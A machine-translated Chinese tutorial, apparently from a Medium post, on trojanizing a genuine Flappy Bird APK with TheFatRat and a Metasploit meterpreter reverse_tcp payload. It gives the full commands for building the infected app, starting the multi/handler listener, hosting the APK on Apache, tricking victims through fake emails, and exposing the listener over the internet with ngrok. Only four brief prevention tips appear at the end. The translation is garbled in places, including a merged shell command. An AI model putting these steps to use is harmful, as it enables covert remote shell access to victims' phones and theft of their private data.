# 利用 FatRat 和 Metasploit 框架为 Android 应用提供后门

> 原文：<https://medium.com/nerd-for-tech/backdooring-android-apps-with-fatrat-and-metasploit-framework-390d32f7f65f?source=collection_archive---------3----------------------->

我们必须指出一点，移动应用在今天是一个巨大的市场。许多企业家放弃了基于网络的经验来构建颠覆性的移动解决方案。今天，智能手机之战仍在 IOs(T1)和安卓(T3)之间进行。两者各有利弊，它们都是用默认的安全设置设计和配置的，对于没有经验的人来说可能不太理想。

这篇文章展示了一个实用而简单的例子，展示了如何在现有的 **APK** 文件上**生成一个反向 TCP 后门**。

这是一种非常常见的**“社会工程攻击”**，它专注于生成一个**反向 TCP 连接**，其中**攻击者**可以在您使用受感染的应用程序时轻松生成对您的 Android 手机的外壳访问，并做一些有害的事情或毫无顾虑地访问您的私人信息。

当一个卑鄙的“社会工程攻击”是因为它的传播方式，我会解释一下这些攻击的典型阶段。

此演示是在控制器和本地实验室上创建的，但也可以在 WAN 网络上轻松完成。

## 社会工程(简单来说)

为了非常清楚地解释这个概念，我们可以将这个术语分成两个元素，其中**社会**可以设置为*个人和职业生活* , **工程**是指*通过遵循某些步骤来执行任务以实现目标*。结合起来。

社会工程是一个描述非技术性入侵的术语，这种入侵严重依赖于人类互动，通过欺骗其他人来打破正常的安全程序。

很简单，真的。这都是关于嘲笑或欺骗人们使用或下载恶意软件并利用它达到恶意目的。

## 社会工程阶段

这次攻击可以概括为这样的内容:

1.  研究:试图从各种资源(垃圾站生活、网站、文档、互动)中收集关于目标的信息。
2.  Hook:在研究阶段完成后，通过尝试与选定的目标开始对话来采取主动。
3.  玩法:让关系更牢固，继续对话，利用关系并获得想要的信息。
4.  退出:走出攻击现场或停止与目标的通信，而不制造场景或做任何可疑的事情。

## 工作实验室

一个在 Oracle Virtualbox 上虚拟化的 **Kali Linux 2018.4 64 位**。

一款**三星 Galaxy S6** 带**安卓 4.4 Kitkat** 带一些常规安全配置。

两台机器都连接到同一个局域网。

## 工具

本次研讨会的关键工具是 **FatRat 开发工具**，该程序用 Python 编写，可以在任何现有的 Android 应用程序或几乎任何其他设备上轻松生成**后门**，这些设备具有来自 **Metasploit 框架**的已知有效载荷(以及其他有效载荷)。这个工具可以执行很多其他的事情，你可以查看这个工具的 **GitHub** 页面[这里](https://github.com/Screetsec/TheFatRat)。

安装过程非常简单，只是要记住，由于安装了依赖项，这可能需要一些时间。

**重要提示**:在安装之前升级和更新你的 Kali 库，这样可以节省你的时间。

太好了，让我们安装 **FatRat** :

1.  从 **GitHub** 中克隆存储库:
2.  `git clone [https://github.com/Screetsec/TheFatRat.git](https://github.com/Screetsec/TheFatRat.git)`
3.  在克隆的存储库中，您将更改对`setup.sh`文件的权限，使其成为一个可执行文件
4.  `cd TheFatRatchmod +x setup.sh && ./setup.sh`
5.  遵循指示

另一方面，我们有 **Metasploit 框架**，这是一个开源渗透工具，用于针对远程目标机器开发和执行漏洞利用代码。可以用来测试计算机系统的弱点，以保护它们，另一方面，它也可以用来闯入远程系统。

这个神奇的工具已经安装在 Kali Linux 操作系统上。

## 让我们暂停一下。

此时(如果这是您第一次听说 Metasploit 框架),我需要更深入地解释一下，因为有些关键术语可能会让您有点困惑。我之前说过这个工具是用来**测试漏洞**的，对吗？一个**漏洞**是一个可以危及任何系统安全的弱点。

这个漏洞是通过使用**漏洞利用**利用**的，这个漏洞利用指的是允许攻击者利用漏洞的软件代码。**

最后，当漏洞被利用时，**有效负载**会发挥作用，这意味着，我们会在目标系统上运行一些代码，以使利用按时持续

尽管如此。开始工作吧。

## 亲自动手

在这个例子中，我从[这里](https://www.apkmirror.com/apk/gears-studios/flappy-bird/flappy-bird-1-3-release/flappy-bird-1-3-android-apk-download/)下载了 **Flappy Bird APK**

这是真正的 APK 游戏。

我亲自将下载名称重命名为一个简单的`flappybird.apk`文件，并将它从下载目录移动到一个名为`backdooring-android`的自定义文件夹中(这是可选的)

## 使用 FatRat

当我在我的 Kali 上安装 FatRat 时，安装人员问我是否要全局设置`fatrat`命令，我说`yes`，这可能与你的过程不同

1.  通过键入`fatrat`,系统将评估和配置必要的和可用的服务
2.  键入 **5** ，用于`Backdooring Original apk [Instagram, Line,etc]`
3.  设置**本地主机** (LHOST)和**本地端口** (LPORT)。这将代表**主机 IP 地址** (Kali)和任何未使用的端口，用于侦听 TCP **会话握手**(我将在后面解释)
4.  现在，我们必须键入`flappybird.apk`的位置**路径**，在我的例子中是在`/root/backdooring-android/flappybird.apk`上
5.  为反向 TCP 设置有效负载(Metasploit 术语)。选择选项`3: android/meterpreter/reverse_tcp`
6.  选择`1: Use Backdoor-apk 0.2.2`这是创建**感染 APK** 的工具

仅此而已。与此同时， **FatRat** 将会反编译**原来的 APK** ，经过一些内部处理后会生成一个新的**感染 APK** ，默认名称为`app_backdoor.apk`

之后，我们将生成监听器设置为`no`，我们将使用 Metasploit 框架手动生成它

## 手动创建监听器

这种攻击的第二部分包括将主机(Kali)设置为**双向 TCP 连接**上的监听器，这是**通过社会工程进行反向 TCP 外壳攻击**的主要目的。该攻击将在用户不注意的情况下对 Android 机器进行外壳访问。

让我们从启动`msfconsole`命令开始

`> msfconsole`

在这之后，我们这样设置`multi/handler`漏洞

`> use multi/handler`

稍后，设置有效负载(FatRat 进程也是如此)

`> set PAYLOAD android/meterpreter/reverse_tcp`

`> set LHOST [the same as your Kali IP]`

`> set LPORT [The same as FatRat process]`

`> exploit`(跑步)

检查 Apache 服务状态(已经安装)

```
systemctl status apache2
```

正在启动服务

```
systemctl start apache2
```

为受害者安置被感染的**后门**(改名或不改名)

`/var/www/html/`目录

## 结束的

在这个局域网环境中，攻击者需要向受害者暴露 Apache 服务器上的这个新的**感染的 APK** ，通过发送一封带有链接的假电子邮件或任何其他方式来欺骗人们在他们的 Android 设备上下载新的 **FlappyBird.apk** 。

一旦受害者下载并打开应用程序，将使用`meterpreter`(有效负载)shell 在监听器上成功创建一个新会话。

攻击者现在可以完全访问目标自定义攻击，或者从 **CLI** 执行某些权限**提升**。

您可以列出会话，例如:

您还可以使用-i 标志选择活动会话并与之交互

`> sessions -i 1`

你可以在这里下载我被感染的文件

我不太确定把你的 **Kali 机器**设置成我以前用的静态 IP 地址，是否能让这个**恶意软件**正常工作。但是，如果是这样的话，我的工作 IP 地址是一个 C 类 IP 地址`192.168.2.120`和 4444 端口。

## 从兰到万

扩展本地 IP 地址的一个简单方法是使用一个简单的名为 [ngRok](https://ngrok.com/) 的隧道工具。这个工具将一个简单的`127.0.0.1`转换成所有公众都可以访问的东西。

查看文档了解安装步骤和**认证令牌**设置。

之后，您可以为 TCP 连接设置 **ngrok** 命令，例如:

`ngrok tcp 1234`为 **TCP** 协议上的 **1234** 协议

整个过程是一样的，但是你需要用 **ngrok** 提供给你的元素替换 **LHOST** (来自 **ngrok** 的 Web 接口)和 **LPORT** (来自 ngrok TCP 连接的端口)。

# 预防的提示

1.  让您的 Android 设备保持最新(补丁和操作系统版本)
2.  千万不要下载任何**。来自不可信来源的 apk**
3.  总是检查网址故意拼错域名
4.  自学

狩猎愉快:)